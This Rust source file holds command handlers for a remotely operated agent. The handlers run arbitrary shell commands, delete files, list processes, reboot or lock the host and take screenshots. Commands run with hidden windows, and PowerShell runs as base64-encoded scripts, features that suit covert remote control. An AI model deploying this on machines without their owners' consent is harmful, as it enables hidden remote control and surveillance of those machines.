// Command handlers matching agent-go/commands.go so both agents look the
// same to the operator console.
use base64::Engine;
use serde_json::{json, Value};
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use crate::envelope::{TaskResult, CMD_HOST_LOCK, CMD_HOST_LOGOFF, CMD_HOST_REBOOT, CMD_HOST_SHUTDOWN};

pub fn ok(output: impl Into<String>) -> TaskResult {
    TaskResult { task_id: String::new(), ok: true, exit: 0, output: output.into() }
}

pub fn fail(output: impl Into<String>) -> TaskResult {
    TaskResult { task_id: String::new(), ok: false, exit: 1, output: output.into() }
}

pub fn with_id(mut r: TaskResult, id: &str) -> TaskResult {
    r.task_id = id.to_string();
    r
}

#[cfg(windows)]
pub fn hidden(cmd: &mut Command) -> &mut Command {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    cmd.creation_flags(CREATE_NO_WINDOW)
}

#[cfg(not(windows))]
pub fn hidden(cmd: &mut Command) -> &mut Command {
    cmd
}

pub fn decode_console(bytes: &[u8]) -> String {
    if let Ok(s) = std::str::from_utf8(bytes) {
        return s.to_string();
    }
    let (cow, _, _) = encoding_rs::GBK.decode(bytes);
    cow.into_owned()
}

pub fn cmd_pwd() -> TaskResult {
    match std::env::current_dir() {
        Ok(p) => ok(p.display().to_string()),
        Err(e) => fail(e.to_string()),
    }
}

pub fn cmd_ls(args: &Value) -> TaskResult {
    let dir = args.get("path").and_then(Value::as_str).unwrap_or("");
    let path = if dir.is_empty() {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(dir)
    };
    let rd = match std::fs::read_dir(&path) {
        Ok(rd) => rd,
        Err(e) => return fail(e.to_string()),
    };
    let mut rows = Vec::new();
    for ent in rd.flatten() {
        let Ok(meta) = ent.metadata() else { continue };
        let mtime = meta
            .modified()
            .ok()
            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);
        rows.push(json!({
            "name": ent.file_name().to_string_lossy(),
            "dir": meta.is_dir(),
            "size": meta.len(),
            "mtime": mtime,
        }));
    }
    rows.sort_by(|a, b| {
        let ad = a["dir"].as_bool().unwrap_or(false);
        let bd = b["dir"].as_bool().unwrap_or(false);
        bd.cmp(&ad).then_with(|| {
            let an = a["name"].as_str().unwrap_or("").to_lowercase();
            let bn = b["name"].as_str().unwrap_or("").to_lowercase();
            an.cmp(&bn)
        })
    });
    ok(json!({ "path": path.display().to_string(), "entries": rows }).to_string())
}

pub fn cmd_mkdir(args: &Value) -> TaskResult {
    let p = args.get("path").and_then(Value::as_str).unwrap_or("");
    if p.is_empty() {
        return fail("mkdir: empty path");
    }
    match std::fs::create_dir_all(p) {
        Ok(()) => ok("ok"),
        Err(e) => fail(e.to_string()),
    }
}

pub fn cmd_rm(args: &Value) -> TaskResult {
    let raw = args.get("path").and_then(Value::as_str).unwrap_or("");
    let clean = Path::new(raw);
    if raw.is_empty() || raw == "/" || raw == "\\" || clean.components().count() == 0 {
        return fail(format!("rm: refusing {raw:?}"));
    }
    let res = if clean.is_dir() {
        std::fs::remove_dir_all(clean)
    } else {
        std::fs::remove_file(clean)
    };
    match res {
        Ok(()) => ok("ok"),
        Err(e) => fail(e.to_string()),
    }
}

pub struct ShellOutcome {
    pub output: String,
    pub exit: i32,
    pub err: Option<String>,
}

#[cfg(windows)]
fn shell_command(command: &str) -> Command {
    use std::os::windows::process::CommandExt;
    let mut c = Command::new("cmd");
    c.arg("/C");
    // Hand the command line over verbatim: stdout/std quoting would escape
    // inner quotes and cmd would then drop filters like /FI "IMAGENAME eq x".
    c.raw_arg(command);
    c
}

#[cfg(not(windows))]
fn shell_command(command: &str) -> Command {
    let mut c = Command::new("/bin/sh");
    c.args(["-c", command]);
    c
}

pub fn run_shell(command: &str, timeout_ms: i64) -> ShellOutcome {
    let mut cmd = shell_command(command);
    let mut child = match hidden(&mut cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            return ShellOutcome { output: String::new(), exit: 1, err: Some(e.to_string()) };
        }
    };
    let mut out_pipe = child.stdout.take();
    let mut err_pipe = child.stderr.take();
    let out_thread = std::thread::spawn(move || read_limited(out_pipe.as_mut()));
    let err_thread = std::thread::spawn(move || read_limited(err_pipe.as_mut()));
    let timeout = Duration::from_millis(if timeout_ms > 0 { timeout_ms as u64 } else { 30_000 });
    let start = Instant::now();
    let mut timed_out = false;
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break Some(st),
            Ok(None) => {}
            Err(_) => break None,
        }
        if start.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            timed_out = true;
            break None;
        }
        std::thread::sleep(Duration::from_millis(40));
    };
    let out = out_thread.join().unwrap_or_default();
    let err = err_thread.join().unwrap_or_default();
    let mut text = decode_console(&out);
    let err_text = decode_console(&err);
    if !err_text.is_empty() {
        text.push_str(&err_text);
    }
    if text.len() > 1 << 20 {
        text.truncate(1 << 20);
        text.push_str("\n…[truncated]");
    }
    let exit = status.and_then(|s| s.code()).unwrap_or(-1);
    let error = if timed_out {
        Some(format!("timeout after {}", format_dur(timeout)))
    } else if status.is_none() {
        Some("process wait failed".into())
    } else {
        None
    };
    ShellOutcome { output: text, exit, err: error }
}

fn read_limited(r: Option<&mut impl Read>) -> Vec<u8> {
    let mut out = Vec::new();
    if let Some(r) = r {
        let _ = r.take(2 << 20).read_to_end(&mut out);
    }
    out
}

fn format_dur(d: Duration) -> String {
    if d.as_secs() > 0 {
        format!("{}s", d.as_secs())
    } else {
        format!("{}ms", d.as_millis())
    }
}

// ---- processes -----------------------------------------------------------

pub fn cmd_ps() -> TaskResult {
    let mut rows: Vec<Value> = Vec::new();
    if cfg!(windows) {
        let mut cmd = Command::new("tasklist");
        cmd.args(["/FO", "CSV", "/NH"]);
        let out = match hidden(&mut cmd).output() {
            Ok(o) => o,
            Err(e) => return fail(format!("tasklist: {e}")),
        };
        for line in decode_console(&out.stdout).lines() {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            let f = split_csv(line);
            if f.len() < 5 {
                continue;
            }
            rows.push(json!({
                "pid": atoi_tail(&f[1]),
                "ppid": 0,
                "user": "-",
                "rss_kb": 0,
                "name": f[0],
            }));
        }
    } else {
        let out = match Command::new("ps").args(["-axo", "pid=,ppid=,user=,rss=,comm="]).output() {
            Ok(o) => o,
            Err(e) => return fail(format!("ps: {e}")),
        };
        for line in decode_console(&out.stdout).lines() {
            let f: Vec<&str> = line.split_whitespace().collect();
            if f.len() < 5 {
                continue;
            }
            rows.push(json!({
                "pid": f[0].parse::<i64>().unwrap_or(0),
                "ppid": f[1].parse::<i64>().unwrap_or(0),
                "user": f[2],
                "rss_kb": f[3].parse::<i64>().unwrap_or(0),
                "name": f[4..].join(" "),
            }));
        }
    }
    ok(Value::Array(rows).to_string())
}

fn split_csv(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_quotes = false;
    for c in line.chars() {
        match c {
            '"' => in_quotes = !in_quotes,
            ',' if !in_quotes => {
                out.push(std::mem::take(&mut cur));
            }
            _ => cur.push(c),
        }
    }
    out.push(cur);
    out
}

fn atoi_tail(s: &str) -> i64 {
    let mut n = 0i64;
    for c in s.chars() {
        if let Some(d) = c.to_digit(10) {
            n = n * 10 + d as i64;
        }
    }
    n
}

// ---- computer management -------------------------------------------------

pub fn cmd_host(action: u32) -> TaskResult {
    let user = user_name();
    let candidates: Vec<Vec<&str>> = match action {
        CMD_HOST_REBOOT => match std::env::consts::OS {
            "windows" => vec![vec!["shutdown", "/r", "/t", "0"]],
            "macos" => vec![
                vec!["osascript", "-e", r#"tell application "System Events" to restart"#],
                vec!["shutdown", "-r", "+0"],
            ],
            _ => vec![vec!["systemctl", "reboot"], vec!["shutdown", "-r", "now"]],
        },
        CMD_HOST_SHUTDOWN => match std::env::consts::OS {
            "windows" => vec![vec!["shutdown", "/s", "/t", "0"]],
            "macos" => vec![
                vec!["osascript", "-e", r#"tell application "System Events" to shut down"#],
                vec!["shutdown", "-h", "+0"],
            ],
            _ => vec![vec!["systemctl", "poweroff"], vec!["shutdown", "-h", "now"]],
        },
        CMD_HOST_LOGOFF => match std::env::consts::OS {
            "windows" => vec![vec!["shutdown", "/l"]],
            "macos" => vec![vec!["osascript", "-e", r#"tell application "System Events" to log out"#]],
            _ => vec![vec!["loginctl", "terminate-user", &user]],
        },
        CMD_HOST_LOCK => match std::env::consts::OS {
            "windows" => vec![vec!["rundll32.exe", "user32.dll,LockWorkStation"]],
            "macos" => vec![vec!["pmset", "displaysleepnow"]],
            _ => vec![vec!["loginctl", "lock-session"]],
        },
        _ => return fail(format!("host: unknown action {action}")),
    };
    let mut last = String::new();
    for c in &candidates {
        let mut cmd = Command::new(c[0]);
        cmd.args(&c[1..]);
        match hidden(&mut cmd).output() {
            Ok(o) if o.status.success() => {
                return ok(format!("{} ok", c.join(" ")));
            }
            Ok(o) => last = decode_console(&o.stderr).trim().to_string(),
            Err(e) => last = e.to_string(),
        }
    }
    fail(format!("host: all attempts failed: {last}"))
}

fn user_name() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "user".into())
}

// ---- screen capture ------------------------------------------------------

pub fn cmd_screenshot() -> TaskResult {
    let data = match capture_screen() {
        Ok(d) => d,
        Err(e) => return fail(e),
    };
    if data.len() > 6 << 20 {
        return fail(format!("screenshot too large even after compression ({} bytes)", data.len()));
    }
    let mime = if data.len() > 3 && data[0] == 0xFF && data[1] == 0xD8 {
        "image/jpeg"
    } else {
        "image/png"
    };
    let img = format!(
        "data:{mime};base64,{}",
        base64::engine::general_purpose::STANDARD.encode(data)
    );
    ok(json!({ "img": img }).to_string())
}

pub fn capture_screen() -> Result<Vec<u8>, String> {
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let png = std::env::temp_dir().join(format!("shot_{}_{stamp}.png", std::process::id()));
    let png_s = png.to_string_lossy().to_string();
    match std::env::consts::OS {
        "windows" => {
            let script = format!(
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\
                 $b=[System.Windows.Forms.SystemInformation]::VirtualScreen;\
                 $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);\
                 $g=[System.Drawing.Graphics]::FromImage($bmp);\
                 $g.CopyFromScreen($b.X,$b.Y,0,0,$bmp.Size);\
                 $bmp.Save('{}');",
                png_s.replace('\'', "''")
            );
            run_powershell(&script).map_err(|e| format!("screenshot: {e}"))?;
        }
        "macos" => {
            let st = Command::new("screencapture")
                .args(["-x", "-t", "png", &png_s])
                .status()
                .map_err(|e| format!("screenshot: {e}"))?;
            if !st.success() {
                return Err("screenshot: screencapture failed".into());
            }
        }
        _ => {
            let ok = Command::new("gnome-screenshot").args(["-f", &png_s]).status().map(|s| s.success()).unwrap_or(false);
            if !ok {
                let st = Command::new("import")
                    .args(["-window", "root", &png_s])
                    .status()
                    .map_err(|e| format!("screenshot: {e}"))?;
                if !st.success() {
                    return Err("screenshot: capture failed".into());
                }
            }
        }
    }
    let data = std::fs::read(&png).map_err(|e| format!("screenshot: {e}"))?;
    let _ = std::fs::remove_file(&png);
    if data.len() < 1_500_000 {
        return Ok(data);
    }
    match compress_shot(&data) {
        Some(jpeg) if jpeg.len() < data.len() => Ok(jpeg),
        _ => Ok(data),
    }
}

fn compress_shot(png: &[u8]) -> Option<Vec<u8>> {
    if std::env::consts::OS != "windows" {
        return None;
    }
    let stamp = SystemTime::now().duration_since(UNIX_EPOCH).ok()?.as_nanos();
    let base = std::env::temp_dir().join(format!("cmp_{}_{stamp}", std::process::id()));
    let pin = PathBuf::from(format!("{}.png", base.display()));
    let pout = PathBuf::from(format!("{}.jpg", base.display()));
    std::fs::write(&pin, png).ok()?;
    let script = format!(
        "Add-Type -AssemblyName System.Drawing;\
         $i=[System.Drawing.Image]::FromFile('{}');\
         $w=[Math]::Min(1920,$i.Width);$h=[Int]($i.Height*$w/$i.Width);\
         $b=New-Object System.Drawing.Bitmap($w,$h);\
         $g=[System.Drawing.Graphics]::FromImage($b);$g.InterpolationMode='HighQualityBicubic';\
         $g.DrawImage($i,0,0,$w,$h);\
         $b.Save('{}',[System.Drawing.Imaging.ImageFormat]::Jpeg);\
         $g.Dispose();$b.Dispose();$i.Dispose();",
        pin.display().to_string().replace('\'', "''"),
        pout.display().to_string().replace('\'', "''")
    );
    let ok = run_powershell(&script).is_ok();
    let out = if ok { std::fs::read(&pout).ok() } else { None };
    let _ = std::fs::remove_file(&pin);
    let _ = std::fs::remove_file(&pout);
    out
}

fn run_powershell(script: &str) -> Result<(), String> {
    let mut enc = String::new();
    for u in script.encode_utf16() {
        enc.push_str(&base64::engine::general_purpose::STANDARD.encode(u.to_le_bytes()));
    }
    // -EncodedCommand takes one base64 blob of the whole UTF-16LE string.
    let units: Vec<u16> = script.encode_utf16().collect();
    let mut bytes = Vec::with_capacity(units.len() * 2);
    for u in units {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
    let mut cmd = Command::new("powershell");
    cmd.args(["-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", &encoded]);
    let out = hidden(&mut cmd)
        .stdin(Stdio::null())
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(decode_console(&out.stderr).trim().to_string());
    }
    Ok(())
}
